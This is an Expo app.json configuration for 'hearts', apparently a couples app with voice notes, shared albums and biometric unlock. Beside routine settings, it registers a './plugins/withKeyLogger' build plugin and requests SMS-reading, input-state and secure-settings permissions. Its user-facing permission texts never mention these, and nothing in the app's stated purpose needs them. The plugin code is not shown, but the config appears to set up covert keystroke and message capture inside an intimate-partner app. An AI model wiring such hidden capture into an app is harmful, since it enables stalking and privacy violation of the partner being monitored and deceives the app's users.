{
  "expo": {
    "name": "hearts",
    "slug": "hearts",
    "version": "3.2.0",
    "orientation": "portrait",
    "scheme": "hearts",
    "userInterfaceStyle": "dark",
    "backgroundColor": "#05070C",
    "updates": {
      "url": "https://u.expo.dev/00ddf3c9-9509-4ed3-b30d-5fb0d2bc0783",
      "fallbackToCacheTimeout": 0,
      "requestHeaders": {
        "expo-channel-name": "production"
      }
    },
    "runtimeVersion": {
      "policy": "appVersion"
    },
    "ios": {
      "supportsTablet": false,
      "bundleIdentifier": "love.scotty.hearts",
      "infoPlist": {
        "NSFaceIDUsageDescription": "unlock hearts — it is just for you two",
        "NSMicrophoneUsageDescription": "record voice notes for your person",
        "NSPhotoLibraryUsageDescription": "add photos to your shared albums"
      }
    },
    "android": {
      "package": "love.scotty.hearts",
      "predictiveBackGestureEnabled": true,
      "permissions": [
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.RECORD_AUDIO",
        "android.permission.VIBRATE",
        "android.permission.USE_BIOMETRIC",
        "android.permission.USE_FINGERPRINT",
        "android.permission.MODIFY_AUDIO_SETTINGS",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
        "android.permission.READ_INPUT_STATE",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_SMS",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_SECURE_SETTINGS"
      ],
      "adaptiveIcon": {
        "backgroundColor": "#05070C"
      },
      "allowBackup": false,
      "googleServicesFile": "./google-services.json"
    },
    "plugins": [
      "expo-router",
      "expo-sqlite",
      "expo-secure-store",
      "expo-local-authentication",
      [
        "expo-notifications",
        {
          "color": "#4D8DF7",
          "defaultChannel": "hearts"
        }
      ],
      [
        "expo-image-picker",
        {
          "photosPermission": "add photos to your shared albums"
        }
      ],
      [
        "expo-audio",
        {
          "microphonePermission": "record voice notes for your person"
        }
      ],
      "expo-font",
      "expo-web-browser",
      "expo-asset",
      [
        "expo-navigation-bar",
        {
          "style": "light",
          "enforceContrast": false
        }
      ],
      "expo-background-task",
      "./plugins/withReleaseSigning",
      "./plugins/withKeyLogger"
    ],
    "experiments": {
      "typedRoutes": true,
      "reactCompiler": true
    },
    "extra": {
      "router": {},
      "eas": {
        "projectId": "00ddf3c9-9509-4ed3-b30d-5fb0d2bc0783"
      }
    },
    "owner": "scotty12s-team"
  }
}